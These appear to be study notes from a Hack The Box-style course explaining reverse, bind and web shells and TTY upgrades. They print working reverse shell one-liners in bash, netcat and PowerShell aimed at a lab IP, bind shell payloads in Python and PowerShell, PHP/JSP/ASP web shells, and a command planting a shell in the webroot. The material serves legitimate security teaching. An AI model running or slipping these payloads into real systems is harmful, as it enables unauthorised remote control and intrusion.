A `shell` is a *program that takes input from the user via the keyboard and passes these commands to the operating system*. Practically speaking, it's **just the terminal command line.**
To **obtain a shell** means that we have successfully **forced the target machine to give us a remote CLI**. 
There are three types of shells:
## Reverse Shell
#### Description
An attack where the victim computer initiates the network connection back to the attacker’s machine, handing over its command line terminal.

Reverse shells are handy when we want a quick, reliable connection to our compromised victim, but can be very fragile. Once it is stopped, or if we lose our connection, we have to re-use the exploit to execute the reverse shell again and regain access.
### How it works
1. The attacker starts a listener program (like Netcat) on their machine and waits.
2. The attacker uses an exploit (RCE) to make the victim run a network command.
3. The victim computer dials out to the attacker's specific IP address and port, opening the line.
### Why it works
1. **Firewalls block inside traffic, not outside traffic.**
	1. Security systems are set up to strictly block random connections trying to get *in* from the internet. However, they are lax about letting internal computers connect *out* (like loading a website or checking updates).
2. **The "Established" rule loophole.**
	1. Because the victim started the call from the inside, the firewall approves the connection and opens up a two-way highway for that conversation. The attacker can now slide any command they want back down that approved highway.
### Process
#### Step 1: Listener
We being by setting up a [[netcat]] listener on a port of our choosing:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
```
#### Step 2: Connect Back IP
We now have a `netcat` listener waiting for a connection, so we can execute the reverse shell command that connects the victim back to us.
First, we need to find our system's IP so we know where to send the connection:

```bash
$ ip a
...SNIP... 
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN 
group default qlen 500 
	link/none 
	inet 10.10.10.10/23 scope global tun0 
...SNIP...
```

> We are connecting to the IP in `tun0` because we can only connect to HTB boxes through the VPN connection, as they do not have internet access. In a real scenario, we may directly connect through `eth0`.

#### Step 3: Reverse Shell Command
The command we run depends on the victims OS, and what applications we can access. [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) has a comprehensive list of reverse shell commands that covers a wide range of compromised hosts.

Here are a few examples of more reliable reverse shell commands for both Linux and Windows:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Once we've utilised an exploit to execute one of the above commands, we should receive a connection in our `netcat` listener:

```bash
listening on [any] 1234 ... 
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572 

id # Input
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Once we receive our connection, we're able to type a command (in this case `id`) and get its output back, all on our machine.

---
## Bind Shell
### Description
The opposite of a `reverse` shell. The victim is forced to open a new port on itself and attach its terminal directly to that port, which the attacker then connects to.

Unlike a `reverse` shell however, if we drop connection for any reason, we can just reconnect. On the other hand, if the bind shell command is stopped, or the remote host rebooted, we still lose access and would have to exploit it again to reconnect.
### How it works
1. The attacker uses an exploit to force the victim to run a background listener.
2. The victim binds its terminal to that listener port.
3. The attacker manually connects inward to that port.
### Why it works
These are the scenarios in which `bind` shells are used:
1. **The firewall is poorly configured.** 
	1. For example, a third-party might've demanded that all ports be left open to make integration of their software easier, which if not cleaned allows the attacker to take control of a random unused port.
2. **The attacker has already obtained access to the internal network, and is using it for lateral movement.**
	1. Most networks focus money and effort on securing the network from the outside, assuming that this is where attacks will originate. This means that once the internal network is compromised, there is little in place to stop an attacker.
	2. This could look like obtaining a reverse shell, and then connecting a bind shell from that machine to an adjacent internal machine.
3. **The attacker hijacks an already approved port.**
	1. An e-commerce site, for example, must let `HTTP` and `HTTPS` traffic in, meaning ports 80 and 443 are open to the outside world. 
	2. An attacker might kill the legitimate web server, and then bind a shell to the now open port. The firewall has already approved communication on port 443, so it sees nothing wrong.

### Process
#### Step 1: Bind Shell Command

Once again, we can look to [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a suitable command. 

> We start a listening connection on port `1234` with IP `0.0.0.0` (any IP) on the victim so that we can connect from anywhere.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Step 2: Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port, which we'll now connect to using `netcat`:

```bash
$ nc [ip] 1234

id # Input
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We're immediately dropped into a bash session and can interact with the target directly.

---
## TTY Upgrade
### Description
An optimisation process used immediately after catching a raw shell to convert a fragile, dumb connection into a stable terminal.

Once we connect through `netcat`, we'll notice that we can only type or backspace. We can't move our cursor to edit commands, or go up through history. To do that, we need to upgrade our TTY.
### How it works
1. When you first catch a shell via Netcat, it is just a dumb text pipe. It lacks keyboard features and system variables.
2. The attacker runs a sequence of scripts on the victim (like Python) to force the OS to generate a real pseudo-terminal interface.
3. The attacker tweaks their local terminal settings to pass keyboard shortcuts straight through the network.
### Why it works
These are the reasons why a `TTY Upgrade` is mandatory during a hack:
1. **The shell is too fragile.** 
	1. In a raw netcat shell, if you make a typo, you cannot use the left arrow key to go back and fix it. Pressing it just prints garbage characters like `^[[D`.
2. **Accidental disconnects.**
	1. If you run a command that hangs and you instinctively press `Ctrl + C` to stop it, you will kill your entire network connection instead of just the command. You have to exploit the machine all over again.
3. **Interactive commands fail.**
	1. Programs that require user interaction or text layouts (like `sudo`, `mysql`, or text editors like `nano`) will completely freeze or refuse to run because they don't detect a real terminal on your end. The upgrade tricks the OS into thinking a physical keyboard is plugged into the server.

### Process

#### Step 1: Upgrading TTY
There are multiple methods, but for now we'll look at the `python/stty` method. In our `netcat` shell, we'll use the following command to use python to upgrade our shell to a full TTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After running that, hitting `ctrl+z` sends our shell to the background and takes us back to our local terminal where we input the following `stty` command:

```bash
www-data@remotehost$ ^Z 

[1] Stopped nc -lvnp 1234 
user@htb[/htb]$ stty raw -echo 
user@htb[/htb]$ fg # [Enter] 
# [Blank Line]
# [Enter] 
www-data@remotehost$
```

Entering `fg` brings our `netcat` shell back to the foreground, at which point our terminal will show a blank line. Hitting enter again gets us back to our shell. We now have a fully working TTY shell with command history and everything else.

#### Step 2: Cleanup
We might notice the shell does not cover the whole terminal. To fix this, we need to figure out a few variables. We can open a second terminal window, set it to the size we want, then run the following to get our variables:

```bash
$ echo $TERM 
xterm-256color
$ stty size
67 318
```

We now know the `TERM` variable, as well as the values for `rows` and `columns`, which we can use back in our `netcat` shell:

```bash
www-data@remotehost$ export TERM=xterm-256color 
www-data@remotehost$ stty rows 67 columns 318
```

Now we should have a `netcat` shell with the terminal's full features.

## Web Shell
### Description
A webscript, typically `PHP`or `ASPX` that accepts commands through HTTP request parameters, executes commands and prints the output back to the webpage. Functionally, its very similar to command injection, just that we've leveraged an exploit such that we no longer need to inject the command.

A benefit of the web shell is that it bypasses firewalls, as it doesn't open a new connection but instead runs on whatever port the web application is using. Another is that if the compromised host is rebooted the web shell would still be in p

### Process
#### Step 1: Writing our Web Shell
We need to write a web shell that takes our command through a `GET` request, executes it, and prints the output back. A web shell script is typically very short and can be easily memorised:

```php
<?php system($_REQUEST["cmd"]); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

#### Step 2: Uploading our Web Shell
Once we've written the shell, we need to place it in the victim's web directory (webroot) to execute the script via the web browser. This can be done through a vulnerability in an upload feature.

However, if we only have RCE through an exploit, we can write our shell directly to the webroot to access it over the web. So, our first step is to identify where the webroot is. The following are some common default webroot paths:

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |
We can check these directories to see which webroot is in use and then use `echo` to write our web shell. For example, if we were attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

#### Step 3: Accessing our Web Shell
Once we've written and uploaded the web shell, we can access it either through the browser or using `cURL`:
##### Browser
We visit the `shell.php` page and use `?cmd=[command]` to execute our commands. for example:

```URL
http://SERVER_IP:PORT/shell.php?cmd=id

[WEBPAGE MIGHT LOOK LIKE:]
uid=33(www-data) gid[...]
``` 

##### cURL
Alternatively, we run the following `curl` command in the same way:

```bash
$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

